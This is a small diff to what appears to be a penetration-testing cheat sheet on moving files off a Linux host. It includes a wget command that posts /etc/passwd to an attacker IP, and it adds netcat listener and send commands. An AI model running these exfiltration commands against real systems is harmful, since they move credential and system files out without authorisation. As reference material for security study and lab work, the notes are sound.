@@ -29,6 +29,11 @@ Linux
 
 		wget --post-file=/etc/passwd <attacker IP>:<listen_port>
 		
+		Box to transfer to:
+			nc -nvlp 1337 > file
+		Box to transfer from
+			cat file | nc box-to-transfer-to 1337
+
 
 
 Windows
